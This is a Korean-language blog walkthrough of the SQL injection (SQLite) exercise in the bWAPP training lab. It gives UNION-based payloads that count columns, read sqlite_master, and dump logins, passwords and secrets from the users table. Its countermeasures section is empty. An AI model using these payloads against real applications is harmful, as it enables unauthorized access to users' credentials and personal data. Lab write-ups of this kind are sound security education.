---
title: "[bWAPP] 1. Injection - SQL Injection - (SQLite)"
---

<br>

## Injection

공격자가 신뢰할 수 없는 입력을 프로그램에 주입하도록 하는 공격.

<br>

<br>

## SQL Injection

응용 프로그램 보안 상의 허점을 의도적으로 이용해, 

임의의 SQL문을 주입하여 악의적인 SQL문을 실행하게 함으로써

DB를 비정상적으로 조작하는 코드 인젝션의 대표적인 공격.

이로인해 공격자가 DB에 저장되어 있는 다른 사용자의 개인 정보 등 허가되지 않은 정보에 접근하여,

데이터 변조 및 조작 가능.

<br>

### SQLite

MySQL이나 PostgreSQL과 같은 DBMS지만,

서버가 아니라 응용프로그램에 넣어 사용하는 비교적 가벼운 DB.

일반적인 DBMS에 비해 대규모작업에는 적합하지 않지만, 중소 규모라면 속도에 손색 없음.

또 API는 단순히 라이브러리를 호추하는 것만 있으며, 데이터를 저장하는 데 하나의 파일만을 사용하는 것이 특징.

<br>

## Object

개인정보를 탈취해보자

![image-20220316215828299](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316215828299.png)

- 똑같이 진행해보자.
- SQLite는 문법이 조금 다른데 같은 방식으로 진행하면서 설명하겠다.

<br>

### 항상 참 구문

![image-20220316220032987](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316220032987.png)

- `"SELECT column FROM tables WHERE movie= ' " &movie " ' "` 마찬가지로 다음과 같이 SQL 문이 작성됐을거라 유추해보자.
- 일반적인 DBMS는 주석이 #인데 SQLite는 -- 이다.
- 아무튼 항상 참인 구문을 넣어 전체를 조회해봤다.

<br>

### 컬럼 갯수

![image-20220316220340113](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316220340113.png)

`' union select all 1,2,3,4,5,6 --` 

- `' union select all 1--` ~ `' union select all 1,2,3,4,5,6--` 까지 쭉해보면 컬럼 갯수가 6개인 것을 확인할 수 있다.

<br>

### 테이블 확인

![image-20220316220903944](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316220903944.png)

`' union select all 1,tbl_name,3,4,5,6 from sqlite_master--` 

- tbl_name = table_name 이고
- sqlite_master = inforamtion_schema 이다.
  - information_schema는 MySQL 서버내에 존재하는 DB의 메타정보(DB,테이블,컬럼 등의 모든 정보)

<BR>

### 컬럼 확인

![image-20220316221143015](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316221143015.png)

`0' union select all 1,sql,3,4,5,6 from sqlite_master where tbl_name='users'--` 

- slq = column_name
- 컬럼들 확인
- 참고로 앞에 0을 지정해주면 내가 조회하고자 하는 자료들만 볼 수 있다.

<br>

### 컬럼 속성

![image-20220316221437697](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316221437697.png)

`' union select all 1,id,login,password,secret,6 from users--`

- 성공적으로 개인정보를 갈취했다.

<br>

<br>

## 대응방안







